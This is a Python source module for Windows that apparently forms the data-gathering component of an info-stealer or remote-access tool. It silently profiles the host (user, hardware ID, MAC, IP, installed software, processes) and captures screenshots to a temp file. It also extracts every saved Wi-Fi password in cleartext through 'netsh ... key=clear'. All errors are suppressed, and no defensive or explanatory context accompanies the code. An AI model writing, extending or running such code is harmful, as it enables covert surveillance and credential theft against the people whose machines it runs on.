import os
import re
import platform
import subprocess
import time
import socket
import uuid
import threading
import ctypes
from . import utils
try:
    from PIL import ImageGrab
except:
    ImageGrab = None

class SystemInfo:
    def __init__(self):
        self.info = {}

    def gather(self):
        self.info['hostname'] = os.environ.get('COMPUTERNAME', platform.node())
        self.info['username'] = os.environ.get('USERNAME', 'Unknown')
        self.info['os'] = platform.platform()
        self.info['os_version'] = platform.version()
        self.info['windows_version'] = self.get_windows_version()
        self.info['arch'] = platform.machine()
        self.info['processor'] = platform.processor()
        self.info['cpu_count'] = os.cpu_count() or 'N/A'
        self.info['cpu_physical'] = self._get_physical_cpu_count()
        self.info['ram'] = self.get_ram_info()
        self.info['hwid'] = self.get_hwid()
        self.info['uuid'] = str(uuid.UUID(int=uuid.getnode()))
        self.info['boot_time'] = self.get_boot_time()
        self.info['uptime'] = self.get_uptime()
        self.info['local_ip'] = self.get_local_ip()
        self.info['mac'] = ':'.join(hex(uuid.getnode())[2:].zfill(12)[i:i+2] for i in range(0, 12, 2))
        self.info['user_domain'] = os.environ.get('USERDOMAIN', 'Unknown')
        self.info['home_dir'] = os.path.expanduser('~')
        self.info['desktop_dir'] = os.path.join(os.path.expanduser('~'), 'Desktop')
        self.info['install_date'] = self.get_windows_install_date()
        self.info['timezone'] = time.tzname
        self.info['current_time'] = time.strftime('%Y-%m-%d %H:%M:%S')
        self.info['screen_size'] = self.get_screen_size()

    def get_windows_version(self):
        try:
            import winreg
            rkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows NT\CurrentVersion')
            product_name = winreg.QueryValueEx(rkey, 'ProductName')[0]
            try:
                current_build = winreg.QueryValueEx(rkey, 'CurrentBuild')[0]
                if current_build and current_build.isdigit() and int(current_build) >= 22000:
                    product_name = product_name.replace('Windows 10', 'Windows 11')
            except:
                pass
            try:
                edition_id = winreg.QueryValueEx(rkey, 'EditionID')[0]
                if edition_id:
                    mapping = {
                        'Core': 'Home', 'CoreSingleLanguage': 'Home', 'CoreN': 'Home N',
                        'Professional': 'Pro', 'ProfessionalN': 'Pro N',
                        'Enterprise': 'Enterprise', 'Education': 'Education',
                        'ProfessionalWorkstation': 'Pro Workstation',
                    }
                    for eid, label in mapping.items():
                        if edition_id.startswith(eid):
                            if label not in product_name:
                                product_name += ' ' + label
                            break
            except:
                pass
            winreg.CloseKey(rkey)
            return str(product_name)
        except:
            pass
        try:
            output = subprocess.check_output('wmic os get Caption', shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
            for line in output.split('\n'):
                line = line.strip()
                if 'Windows' in line:
                    ver = platform.version()
                    parts = ver.split('.')
                    if len(parts) >= 3 and parts[2].isdigit() and int(parts[2]) >= 22000:
                        return line.replace('Windows 10', 'Windows 11')
                    return line
        except:
            pass
        try:
            ver = platform.version()
            parts = ver.split('.')
            if len(parts) >= 3 and parts[2].isdigit() and int(parts[2]) >= 22000:
                return 'Windows 11 (build ' + ver + ')'
            return 'Windows 10 (build ' + ver + ')'
        except:
            return platform.platform()

    def _get_physical_cpu_count(self):
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'HARDWARE\DESCRIPTION\System\CentralProcessor')
            count = 0
            try:
                i = 0
                while True:
                    winreg.EnumKey(key, i)
                    count += 1
                    i += 1
            except:
                pass
            winreg.CloseKey(key)
            return count or 'N/A'
        except:
            return 'N/A'

    def get_ram_info(self):
        try:
            kernel32 = ctypes.windll.kernel32
            class MEMORYSTATUSEX(ctypes.Structure):
                _fields_ = [
                    ('dwLength', ctypes.c_ulong),
                    ('dwMemoryLoad', ctypes.c_ulong),
                    ('ullTotalPhys', ctypes.c_ulonglong),
                    ('ullAvailPhys', ctypes.c_ulonglong),
                    ('ullTotalPageFile', ctypes.c_ulonglong),
                    ('ullAvailPageFile', ctypes.c_ulonglong),
                    ('ullTotalVirtual', ctypes.c_ulonglong),
                    ('ullAvailVirtual', ctypes.c_ulonglong),
                    ('ullAvailExtendedVirtual', ctypes.c_ulonglong),
                ]
            mem = MEMORYSTATUSEX()
            mem.dwLength = ctypes.sizeof(mem)
            kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
            total_gb = mem.ullTotalPhys / (1024**3)
            used_gb = (mem.ullTotalPhys - mem.ullAvailPhys) / (1024**3)
            pct = mem.dwMemoryLoad
            return '{:.1f}GB / {:.1f}GB ({}%)'.format(used_gb, total_gb, pct)
        except:
            return 'N/A'

    def get_hwid(self):
        return utils.get_hwid()

    def get_boot_time(self):
        try:
            bt = self._get_boot_timestamp()
            return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(bt))
        except:
            return 'Unknown'

    def _get_boot_timestamp(self):
        try:
            output = subprocess.check_output('wmic os get lastbootuptime', shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
            for line in output.split('\n'):
                line = line.strip()
                if line and line.isdigit() and len(line) >= 14:
                    import datetime
                    dt = datetime.datetime.strptime(line[:14], '%Y%m%d%H%M%S')
                    return dt.timestamp()
        except:
            pass
        try:
            kernel32 = ctypes.windll.kernel32
            uptime_ms = ctypes.c_ulonglong(0)
            kernel32.GetTickCount64(ctypes.byref(uptime_ms))
            return time.time() - (uptime_ms.value / 1000)
        except:
            return time.time()

    def get_uptime(self):
        try:
            uptime_seconds = int(time.time() - self._get_boot_timestamp())
            days = uptime_seconds // 86400
            hours = (uptime_seconds % 86400) // 3600
            minutes = (uptime_seconds % 86400 % 3600) // 60
            return '{}d {}h {}m'.format(days, hours, minutes)
        except:
            return 'Unknown'

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return 'Unknown'

    def get_windows_install_date(self):
        try:
            output = subprocess.check_output('wmic os get installdate', shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
            for line in output.split('\n'):
                line = line.strip()
                if line and line.isdigit():
                    return line[:4] + '-' + line[4:6] + '-' + line[6:8]
            return 'Unknown'
        except:
            pass
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows NT\CurrentVersion')
            install_time = winreg.QueryValueEx(key, 'InstallDate')[0]
            winreg.CloseKey(key)
            return time.strftime('%Y-%m-%d', time.localtime(int(install_time)))
        except:
            return 'Unknown'

    def get_screen_size(self):
        try:
            import ctypes
            user32 = ctypes.windll.user32
            return str(user32.GetSystemMetrics(0)) + 'x' + str(user32.GetSystemMetrics(1))
        except:
            return 'Unknown'

    def take_screenshot(self):
        try:
            if ImageGrab:
                screenshot = ImageGrab.grab()
                path = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), 'sv_ss_' + utils.generate_id() + '.png')
                screenshot.save(path)
                return path
        except:
            pass
        return None

    def get_installed_software(self):
        software = []
        try:
            output = subprocess.check_output('wmic product get name', shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
            software = [line.strip() for line in output.split('\n') if line.strip() and 'Name' not in line]
            if software:
                return software
        except:
            pass
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall')
            for i in range(winreg.QueryInfoKey(key)[0]):
                try:
                    subkey_name = winreg.EnumKey(key, i)
                    subkey = winreg.OpenKey(key, subkey_name)
                    name = winreg.QueryValueEx(subkey, 'DisplayName')[0]
                    if name:
                        software.append(str(name))
                    winreg.CloseKey(subkey)
                except:
                    pass
            winreg.CloseKey(key)
        except:
            pass
        return software

    def get_running_processes(self):
        try:
            output = subprocess.check_output('tasklist /fo csv /nh', shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
            processes = []
            for line in output.split('\n'):
                line = line.strip()
                if line and ',' in line:
                    parts = line.split(',')
                    if len(parts) >= 2:
                        name = parts[0].strip('" ')
                        pid = parts[1].strip('" ')
                        if name and pid:
                            processes.append({'name': name, 'pid': pid})
            return processes
        except:
            return []

    def get_wifi_passwords(self):
        try:
            output = subprocess.check_output('netsh wlan show profiles', shell=True).decode()
            profiles = re.findall(r'All User Profile\s+:\s+(.+)', output)
            wifi_data = []
            for profile in profiles:
                try:
                    info = subprocess.check_output('netsh wlan show profile "' + profile + '" key=clear', shell=True).decode()
                    password = re.search(r'Key Content\s+:\s+(.+)', info)
                    wifi_data.append((profile.strip(), password.group(1).strip() if password else 'No Password'))
                except:
                    pass
            return wifi_data
        except:
            return []
